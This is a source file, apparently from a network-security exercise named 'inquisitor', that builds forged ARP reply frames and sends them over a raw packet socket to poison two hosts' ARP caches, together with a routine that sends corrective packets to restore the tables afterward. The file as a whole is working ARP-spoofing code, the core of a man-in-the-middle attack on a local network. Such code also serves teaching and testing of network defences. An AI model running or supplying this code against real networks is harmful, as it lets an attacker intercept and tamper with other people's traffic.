#include "../inc/inquisitor.h"

void base_init_packet(t_packet *packet) {
  memset(packet, 0, sizeof(*packet));
  packet->ar_hrd = htons(HW_TYPE_ETHERNET);
  packet->ar_pro = htons(ETH_P_IP);
  packet->ar_hln = LEN_HW_ETHERNET;
  packet->ar_pln = LEN_PROTO_IPV4;
  packet->ar_op = htons(ARPOP_REPLY);
}

void fill_field_packet(
    t_packet *packet,
    const int8_t *sender_mac,
    const int8_t *sender_ip,
    const int8_t *target_mac,
    const int8_t *target_ip) {
  uint32_t tmp_int;
  memcpy(packet->ar_sha, sender_mac, 6); //my mac address
  tmp_int = inet_addr((const char *) sender_ip);
  memcpy(packet->ar_sip, &tmp_int, 4); //src ip target
  memcpy(packet->ar_tha, target_mac, 6); //target mac address
  tmp_int = inet_addr((const char *) target_ip);
  memcpy(packet->ar_tip, &tmp_int, 4); //target ip address
}

void init_ether_frame(
    ethernet_frame *frame,
    void *dest_addr,
    void *src_addr,
    void *payload,
    size_t len_pld) {
  memset(frame, 0, sizeof(*frame));
  memcpy(frame->dest_addr, dest_addr, 6);
  memcpy(frame->src_addr, src_addr, 6);
  *(uint16_t *) frame->ethertype = htons(ETH_P_ARP);
  memcpy(frame->data, payload, len_pld);
}

static void init_dest_sock(struct sockaddr_ll *dest, t_inquisitor *inquisitor) {
  memset(dest, 0, sizeof(*dest));
  dest->sll_family = AF_PACKET;
  dest->sll_protocol = htons(ETH_P_ARP);
  dest->sll_ifindex = (int32_t) inquisitor->index;
  dest->sll_hatype = htons(ARPHRD_ETHER);
  dest->sll_halen = ETH_ALEN;
  dest->sll_pkttype = PACKET_OTHERHOST;
}

void send_fake_arp_packet(t_inquisitor *inquisitor, uint32_t target) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest{};
  ssize_t byte_sent;

  base_init_packet(&packet);
  if (target == 1) {
    fill_field_packet(&packet, (int8_t *)(inquisitor->ifr.ifr_hwaddr.sa_data), inquisitor->ip_src,
                      (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_target);
  }
  else if (target == 2) {
    fill_field_packet(&packet, (int8_t *)(inquisitor->ifr.ifr_hwaddr.sa_data), inquisitor->ip_target,
                      (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_src);
  }
  init_ether_frame(&frame, (void *) (const int8_t[]) {-1, -1, -1, -1, -1, -1},
                   inquisitor->ifr.ifr_hwaddr.sa_data, &packet, sizeof(packet));
  init_dest_sock(&dest, inquisitor);
  byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame), 0,
                     (struct sockaddr *) &dest, sizeof(dest));
  if (byte_sent == -1)
    error("sendto", nullptr, __FILE__, __LINE__, __func__);
}

void restore_arp_tables(t_inquisitor *inquisitor, uint32_t target) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest{};
  ssize_t byte_send;

  base_init_packet(&packet);
  packet.ar_op = htons(ARPOP_REQUEST);
  if (target == 1)
    fill_field_packet(&packet, inquisitor->mac_src_byte_arr, inquisitor->ip_src,
                      (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_target);
  else if (target == 2)
    fill_field_packet(&packet, inquisitor->mac_target_byte_arr, inquisitor->ip_target,
                      (const int8_t[]){-1, -1, -1, -1, -1, -1}, inquisitor->ip_src);
  init_ether_frame(&frame, (void *) (const int8_t[]) {-1, -1, -1, -1, -1, -1}, packet.ar_sha, &packet, sizeof(packet));
  init_dest_sock(&dest, inquisitor);
  memset(frame.dest_addr, 255, 6);
  byte_send = sendto(inquisitor->sock, &frame, sizeof(frame), 0,
                     (struct sockaddr *)&dest, sizeof(dest));
  if (byte_send == -1)
    error("sendto", nullptr, __FILE__, __LINE__, __func__);
  dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, target == 1 ? inquisitor->mac_target : inquisitor->mac_src);
}